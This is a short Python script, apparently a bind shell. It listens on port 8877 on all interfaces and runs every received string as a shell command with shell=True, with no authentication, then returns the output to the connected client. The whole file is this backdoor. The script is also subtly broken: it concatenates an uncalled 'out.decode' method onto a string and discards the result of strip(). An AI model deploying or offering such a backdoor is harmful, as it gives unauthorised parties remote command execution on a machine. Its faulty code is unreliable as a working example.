import socket 
import subprocess 
import os 
host = ''
port =8877 

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port)) 
s.listen() 
conn , addr = s.accept()
print("{} connected to port {}".format(addr[0],addr[1])) 
while True: 
    data = conn.recv(1024)
    data.strip()
    if not data : 
        break 
    else: 
        
        data = data.decode()
        print("echo > {}".format(data)) 
        if (data == "quit"): 
            break 
        else: 
            proc = subprocess.Popen(data , stdout=subprocess.PIPE , shell=True , stderr=subprocess.STDOUT )
            (out,err) = proc.communicate()
            data = data+out.decode
            conn.sendall(data.encode())
s.close()